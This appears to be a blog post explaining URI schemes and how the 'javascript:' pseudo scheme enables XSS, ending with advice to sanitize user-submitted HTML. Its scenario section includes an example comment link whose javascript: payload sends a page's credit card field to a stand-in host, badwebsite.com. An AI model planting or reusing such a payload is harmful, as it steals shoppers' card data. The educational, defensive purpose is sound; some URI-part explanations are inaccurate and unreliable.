---
layout: post
title: Sanitize JavaScript Scheme to Prevent XSS
---

<img src="{{ site.baseurl }}/assets/js-scheme.PNG" alt="js-scheme"/>

Outside of the most commonly known and supported URI schemes (http:// and https://), most modern web browsers support a full roster of alternate and legacy URI schemes.

Here are some alternate URI schemes you may be familiar with already:

 - ftp://
 - mailto:
 - file://

And a few you probably haven't put much thought into, or didn't know existed:

 - javascript:
 - gopher://
 - news:
 - wais://
 - nntp://

URI schemes are the combination of a few separate parts, designed by third parties and adopted into major web browsers. All URI schemes have the following structure:

`and://my:stuff@test.com:8080/location/sublocation?key=things&stuff=keys#section2`

Lets break this down into separate pieces before discussing where protocols can be a security issue.

`and://` - This is where the scheme is declared, and the browser first checks this in order to determine what to do with the following strings.

`my:stuff` - This is the "path" often used to express a hierarchy of data. You don't see this in very many URI's, but in older systems a scheme might declare username and password for an email as `joe:mypassword3`.

`@test.com` - Is the host, you see this most frequently in http:// and https:// URI's. This is used to identify a relevant location.

`:8080` - Here we declare the port. All websites and servers require a port to be declared, but you don't see it often in http:// or https:// URI's because browsers default to port 80 (invisibly) if no other port is declared in the URI.

`location/sublocation` - Refers to a file location on the host.

`?key=things&things=keys` - The query, used to pass through conditional data in the URI as if it was a variable.

`#section` - The URI fragment, also used to pass through conditional data. Typically used to preserve state on the client.

Why do we need to worry about URI Schemes?
------------------------------------------

As you probably have guessed, the URI scheme is so flexible that many companies have taken advantage of it to produce their own schemes which have than been adopted into web browsers. Many of these schemes are still supported for legacy reasons, but have not been updated in years or even decades.

The most notorious of this, is the "**JavaScript Pseudo Scheme**" - a scheme that allows you to pass through a string of JavaScript which will be executed in it's own context but with full access to the current DOM and all of it's nodes.

You've probably seen this in code before, but not recognized it. The most common use case is:

```html
<a href="javascript:void(0);">click me</a>
```

This trick has been used to create links that did not adhere to normal link behavior in many browsers. Really what's happening is the link is executing the statement `void(0);` which returns `undefined`. Typically a browser will reload the page if a link to itself is clicked, but if the link returns undefined the browser will halt execution. Now you have a link to the current page which can call other JavaScript without causing a page reload.

This use case is generally harmless.

Now lets consider another use case, which you can imagine is usable on many insecure websites and apps. Since you have access to arbitrary JavaScript code execution, you can traverse the DOM tree and collect whatever data you desire. 

Consider the following scenario:


----------

Jon is a hacker who is targeting a popular eCommerce site called BuyStuffNow.

BuyStuffNow is like Amazon, except it allows you to buy from one product page without ever leaving (lots of apps do this). The order process goes like this: click a product -> type in credit card -> click purchase to complete transaction.

Below the product is a comments section, where guests can comment on the item and give reviews / warnings to each other. 

Jon devises a plan to craft a malicious link to put in his BuyStuffNow comment. He writes a legitimate review, with a legitimate link:

"Hi friends. IF YOU ARE GOING TO BUY THIS PLEASE READ THIS REVIEW FIRST. I used the product for three hours, than **this** happened."

The link will be constructed as such:

```html
<a href="javascript:console.log($.ajax({type: 'POST', context: this, url: 'http://www.badwebsite.com', data: {
cardNumber: document.querySelector('#creditCardNumber')},
dataType: 'text',
success: function(resultData) { window.location.open('http://www.legitreview.com/product'); }})
)">this</a>
```

To a uneducated user, this is simply a link to a legitimate review on another website. The user may enter their credit card information and than decide to read the review - in which case their credit card information is sent to a malicious web server and stored for malicious uses.

----------

Because the JavaScript pseudo scheme allows arbitrary JavaScript execution with full access to current DOM nodes, any sensitive data on the page can be recorded and sent elsewhere. This is only one possible scenario where the JavaScript pseudo scheme can present an issue. It could also be used for injecting an entire page of scripts into the current tree or replacing the current DOM with an iframe.

In order to prevent this, we need to ensure wherever user submitted HTML is rendered we are sanitizing or purifying the input. Remove any instances of the JavaScript pseudo scheme so they don't have any capacity for creating malicious links or executing malicious JavaScript. Alternatively, create your own markup language or use an existing one like markdown to better ensure your user's security.
